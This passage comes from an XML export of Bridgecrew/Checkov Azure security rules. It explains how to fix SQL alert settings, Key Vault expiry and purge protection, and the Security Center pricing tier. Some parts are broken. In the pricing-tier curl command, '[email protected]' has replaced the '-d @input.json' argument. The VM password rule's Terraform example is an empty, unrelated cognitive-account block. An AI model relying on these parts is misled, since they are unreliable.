<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set each server's <strong>ExcludedDetectionTypes</strong> to <strong>None</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Set-AzureRmSqlServerThreatDetectionPolicy 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt; 
-ExcludedDetectionType "None"
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_mssql_server_security_alert_policy</li>
<li><strong>Argument</strong>: disabled_alerts</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mssql_server_security_alert_policy" "example" {
    ...
+   disabled_alerts = []
    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_72</key>
    <name>Yandex Predictor API key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="yandex-predictor-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-yandex-predictor-api-key"></div>Yandex Predictor API key</div><a aria-label="Skip link to Yandex Predictor API key" class="heading-anchor-icon fa fa-anchor" href="#yandex-predictor-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_72' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_72</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_72' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_26</key>
    <name>Ensure Azure SQL server send alerts to field value is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-send-alerts-to-field-value-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-send-alerts-to-field-value-is-not-set"></div>Azure SQL server send alerts to field value is not set</div><a aria-label="Skip link to Azure SQL server send alerts to field value is not set" class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-send-alerts-to-field-value-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Provide the email address where alerts will be sent when anomalous activities are detected on SQL servers. Providing the email address to receive alerts ensures that any detection of anomalous activities is reported as soon as possible, enabling early mitigation of any potential risk detected.</p>
<p>We recommend you add an email address to the <strong>Send Alerts to</strong> field value for MSSQL servers. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>SQL servers</strong>.</li>
<li>For each server instance:<br/>
a) Click <strong>Advanced Threat Protection</strong>.<br/>
b) In <strong>Send alerts to</strong> enter email addresses as appropriate. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set each server's <strong>Send alerts to</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Set-AzureRmSqlServerThreatDetectionPolicy 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt; 
-NotificationRecipientsEmails "&lt;Recipient Email ID&gt;"
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_mssql_server_security_alert_policy</li>
<li><strong>Argument</strong>: email_addresses</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mssql_server_security_alert_policy" "example" {
    ...
+   email_addresses = ["<a class="__cf_email__" data-cfemail="c3a6bba2aeb3afa683a4aea2aaafeda0acae" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_149</key>
    <name>Ensure Azure Virtual machine does not enable password authentication</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-virtual-machine-enables-password-authentication"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-virtual-machine-enables-password-authentication"></div>Azure Virtual machine enables password authentication</div><a aria-label="Skip link to Azure Virtual machine enables password authentication" class="heading-anchor-icon fa fa-anchor" href="#azure-virtual-machine-enables-password-authentication"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-virtual-machine-does-not-enable-password-authentication' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-virtual-machine-does-not-enable-password-authentication</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-virtual-machine-does-not-enable-password-authentication' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_27</key>
    <name>Ensure MSSQL servers have email service and co-administrators enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mssql-servers-do-not-have-email-service-and-co-administrators-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-mssql-servers-do-not-have-email-service-and-co-administrators-enabled"></div>MSSQL servers do not have email service and co-administrators enabled</div><a aria-label="Skip link to MSSQL servers do not have email service and co-administrators enabled" class="heading-anchor-icon fa fa-anchor" href="#mssql-servers-do-not-have-email-service-and-co-administrators-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Service and Co-administrators to receive security alerts from the SQL server. Providing the email address to receive alerts ensures that any detection of anomalous activities is reported as soon as possible, enabling early mitigation of any potential risk detected.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>SQL servers</strong>.</li>
<li>For each server instance:<br/>
a) Click <strong>Advanced Data Security</strong>.<br/>
b) Navigate to <strong>Threat Detection Settings</strong> section.<br/>
c) Enable <strong>Email service and co-administrators</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable each server's <strong>Email service and co-administrators</strong> for MSSQL, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Set-AzureRmSqlServerThreatDetectionPolicy
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt; 
-EmailAdmins $True
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_mssql_server_security_alert_policy</li>
<li><strong>Argument</strong>: email_account_admins</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mssql_server_security_alert_policy" "example" {
    ...
+   email_account_admins       = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_19</key>
    <name>Ensure standard pricing tier is selected</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="standard-pricing-tier-is-not-selected"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-standard-pricing-tier-is-not-selected"></div>Standard pricing tier is not selected</div><a aria-label="Skip link to Standard pricing tier is not selected" class="heading-anchor-icon fa fa-anchor" href="#standard-pricing-tier-is-not-selected"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The standard pricing tier enables threat detection for networks and virtual machines and allows greater defense-in-depth. It provides threat intelligence, anomaly detection, and behavior analytics in the Azure Security Center. Threat detection is provided by the Microsoft Security Response Center (MSRC).</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to the <strong>Azure Security Center</strong>.</li>
<li>Select <strong>Security policy</strong> blade.</li>
<li>To alter the the security policy for a subscription, click <strong>Edit Settings</strong>. </li>
<li>Select <strong>Pricing tier</strong> blade.</li>
<li>Select <strong>Standard</strong>.</li>
<li>Select <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set the <strong>Pricing Tier</strong> to <strong>Standard</strong>, use the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">az account get-access-token
--query
"{subscription:subscription,accessToken:accessToken}"
--out tsv | xargs -L1 bash -c 'curl -X PUT -H "Authorization: Bearer $1" -H "Content-Type:
application/json"
https://management.azure.com/subscriptions/$0/providers/Microsoft.Security/pr
icings/default?api-version=2017-08-01-preview <a class="__cf_email__" data-cfemail="d4f9b094" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"input.json"'
</code></pre></div></div>
<p>Where <strong>input.json</strong> contains the <strong>Request body json data</strong>, detailed below.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">{
 "id":
"/subscriptions/&lt;Your_Subscription_Id&gt;/providers/Microsoft.Security/pricings/
default",
 "name": "default",
 "type": "Microsoft.Security/pricings",
 "properties": {
 "pricingTier": "Standard"
 }
}
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_security_center_subscription_pricing</li>
<li><strong>Argument</strong>: tier</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
 -   tier = "Free"
 +   tier = "Standard"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-standard-pricing-tier-is-selected' target='_blank'> https://docs.bridgecrew.io/docs/ensure-standard-pricing-tier-is-selected</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-standard-pricing-tier-is-selected' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_40</key>
    <name>Ensure all keys have an expiration date</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-all-keys-have-an-expiration-date"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-all-keys-have-an-expiration-date"></div>Not all keys have an expiration date </div><a aria-label="Skip link to Not all keys have an expiration date " class="heading-anchor-icon fa fa-anchor" href="#not-all-keys-have-an-expiration-date"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Azure Key Vault enables users to store and use cryptographic keys within the Microsoft Azure environment. The exp (expiration time) attribute identifies the expiration time on or after which the key <strong>must not</strong> be used for a cryptographic operation. Keys are not set to expire by default. </p>
<p>We recommend you rotate keys in the key vault and set an explicit expiration time for all keys in the Azure Key Vault. This ensures that the keys cannot be used beyond their assigned lifetimes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Key vaults</strong>.</li>
<li>For each Key vault:<br/>
a) Click <strong>Keys</strong>.<br/>
b) Navigate to the <strong>Settings</strong> section.<br/>
c) Set <strong>Enabled?</strong> to <strong>Yes</strong>.<br/>
d) Set an appropriate <strong>EXPIRATION DATE</strong> on all keys.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update the <strong>EXPIRATION DATE </strong>for the key, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az keyvault key set-attributes 
--name &lt;keyName&gt; 
--vault-name &lt;vaultName&gt; 
--expires Y-m-d'T'H:M:S'Z'
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_key_vault_key</li>
<li><strong>Argument</strong>: expiration_date</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault_key" "generated" {
    ...
+   expiration_date = "2020-12-30T20:00:00Z"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-keys' target='_blank'> https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-keys</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-keys' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_42</key>
    <name>Ensure Azure key vault is recoverable</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-key-vault-is-not-recoverable"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-key-vault-is-not-recoverable"></div>Azure key vault is not recoverable</div><a aria-label="Skip link to Azure key vault is not recoverable" class="heading-anchor-icon fa fa-anchor" href="#azure-key-vault-is-not-recoverable"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The key vault contains object keys, secrets and certificates. Accidental unavailability of a key vault can cause immediate data loss or loss of security functions supported by the key vault objects, such as authentication, validation, verification, and non-repudiation. Deleting or purging a key vault leads to immediate data loss as keys encrypting data, including storage accounts, SQL databases, and/or dependent services provided by key vault objects, such as keys, secrets, and certificates.</p>
<p>We recommended you make the key vault recoverable by enabling the <strong>Do Not Purge</strong> and <strong>Soft Delete</strong> functions. This will prevent accidental deletion by a user running the delete/purge command on the key vault, or an attacker/malicious user does to deliberately to cause disruption. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>There are two key vault properties that play roles in the permanent unavailability of a key vault.</p>
<ol>
<li>
<p><strong>EnablePurgeProtection</strong>:<br/>
<strong>enableSoftDelete</strong> only ensures that the key vault is not deleted permanently and is recoverable for 90 days from the date of deletion. There are scenarios where the key vault and/or its objects are accidentally purged will not be recoverable.<br/>
Setting <strong>enablePurgeProtection</strong> to "true" ensures the key vault and its objects cannot be purged. Enabling both the parameters on key vaults ensures that key vaults and their objects cannot be deleted/purged permanently.</p>
</li>
<li>
<p><strong>SetSoftDeleteRetentionDays (Optional)</strong>:<br/>
Set the number of days that items should be retained for once soft-deleted. This value can be between 7 and 90 (the default) days.</p>
</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>The Azure Portal does not currently have provision to update the respective configurations.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az resource update 
--id /subscriptions/xxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx/resourceGroups/
&lt;resourceGroupName&gt;/providers/Microsoft.KeyVault/vaults/&lt;keyVaultName&gt; 
--set properties.enablePurgeProtection=true properties.enableSoftDelete=true
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_key_vault</li>
<li><strong>Argument</strong>: soft_delete_enabled + purge_protection_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault" "example" {
        ...
+   purge_protection_enabled    = true
+   soft_delete_retention_days  = 7     # Default is 90
}
